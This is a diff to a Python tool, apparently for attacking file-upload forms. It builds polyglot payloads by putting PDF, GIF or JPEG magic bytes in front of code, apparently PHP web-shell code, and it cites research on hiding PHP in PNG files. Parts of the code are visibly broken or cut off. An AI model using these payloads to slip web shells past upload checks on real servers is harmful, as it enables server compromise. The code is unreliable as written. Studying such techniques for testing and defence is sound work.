@@ -67,8 +67,14 @@ echo $output;
 ?>
 """
 
-@dataclass
+
 class FilePayloadFactory:
+
+  def make(self, desiredCode: bytes) -> bytes:
+    return b''
+
+@dataclass
+class FilePayloadReplaceFactory:
   replaceKeyword: str = "__013374901834903810948103__FILE__"
   pattern: bytes
   fakeExtention: str
@@ -77,7 +83,11 @@ class FilePayloadFactory:
     return pattern.replace(replaceKeyword, desiredCode)
 
 @dataclass
-class FilePayloadFactories:
-  pdf: FilePayloadFactory = FilePayloadFactory(pattern=b"""%PDF-1.4\n___013374901834903810948103__FILE__""",fakeExtention="pdf")
-  gif: FilePayloadFactory = FilePayloadFactory(pattern=b"""GIF89a\n__013374901834903810948103__FILE__""",fakeExtention="gif")
-  jpeg: FilePayloadFactory = FilePayloadFactory(pattern=b"""\xFF\xD8\xFF\n__013374901834903810948103__FILE__""",fakeExtention="jpeg")
+class FilePayloadReplace:
+  pdf: FilePayloadReplaceFactory = FilePayloadReplaceFactory(pattern=b"""%PDF-1.4\n___013374901834903810948103__FILE__""",fakeExtention="pdf")
+  gif: FilePayloadReplaceFactory = FilePayloadReplaceFactory(pattern=b"""GIF89a\n__013374901834903810948103__FILE__""",fakeExtention="gif")
+  jpeg: FilePayloadReplaceFactory = FilePayloadReplaceFactory(pattern=b"""\xFF\xD8\xFF\n__013374901834903810948103__FILE__""",fakeExtention="jpeg")
+
+# https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html
+class FilePayloadAdvanced:
+  pngPLTE: x
